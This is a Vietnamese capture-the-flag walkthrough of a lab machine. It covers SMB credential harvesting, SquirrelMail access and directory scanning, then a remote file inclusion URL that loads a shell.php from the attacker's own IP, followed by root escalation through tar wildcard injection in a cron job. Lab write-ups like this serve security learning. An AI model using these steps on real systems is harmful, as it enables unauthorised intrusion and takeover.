khi mà quét cổng thì sẽ thấy được port smb 

<img width="2559" height="1032" alt="image" src="https://github.com/user-attachments/assets/cd59fd97-e817-4fbc-a1ca-c4791ca9509e" />

khi mà smb lên thì sẽ tìm được 2 file là có chứa tài khoản và mật khẩu. Sau đó mình sẽ tiến hành quét thư mục thì tìm được trang này, thử username và password tìm được và đăng nhập thành công

<img width="2556" height="768" alt="image" src="https://github.com/user-attachments/assets/dba078e3-199d-4b8a-88f5-8016f7366163" />

thì như bạn thấy là trang này đang dùng squirrelmail 1.4.23 và đọc trong mail được gửi thì có pass smb của miles dyson

<img width="1833" height="391" alt="image" src="https://github.com/user-attachments/assets/42093ffb-cf0b-42c3-9025-b62b2e541bd8" />

vào smb của miles thì tìm được file txt chứa thư mục ẩn của web. Sau dó dùng gobuster để quét thêm lần nữa thì tìm được trang đăng nhập

<img width="2559" height="1181" alt="image" src="https://github.com/user-attachments/assets/c8ce30ee-1b3b-40c5-8efa-af6801d41f6f" />

ở đây thì mình chẳng có username và password để đăng nhập vào nên sẽ search google CMS thì tìm được lỗi này

<img width="2559" height="1134" alt="image" src="https://github.com/user-attachments/assets/357867fd-dcbe-49c7-8a5a-6d29d6fc9c97" />

thì có thể chèn url từ máy mình và thực thi file đó trên server: http://<IP_MÁY_MỤC_TIÊU>/45kra24zxs28v3vd/administrator/alerts/alertConfigField.php?urlConfig=http://<IP_TUN0_CỦA_BẠN>:8000/shell.php

<img width="2559" height="1120" alt="image" src="https://github.com/user-attachments/assets/77879560-5c54-4a2a-a581-65eb0742ca59" />

mình tìm được 2 thư mục này và khi đọc crontab của nó thì file đang được chạy tự động, vậy mình có thể lợi dung để mở bash đưới quyền root

<img width="2331" height="548" alt="image" src="https://github.com/user-attachments/assets/5f463535-e718-42fe-9b56-b0238d65be38" />

thì đây là lỗ hổng Tar Wildcard Injection. Do là mình là người dùng www-data nên sẽ chỉ tạo file được ở /var/www/html thôi. sau khi nhập các câu lệnh trên hình thì đợi để nó lặp lịch lại. khi mà thấy người dùng root có quyền s rồi thì mở bash lên thôi

<img width="2559" height="1093" alt="image" src="https://github.com/user-attachments/assets/e0a674cc-a9c6-49a5-b1eb-ff4f86e8f28a" />
<img width="2559" height="593" alt="image" src="https://github.com/user-attachments/assets/effa262f-42a1-45c3-93aa-2316774c2470" />


















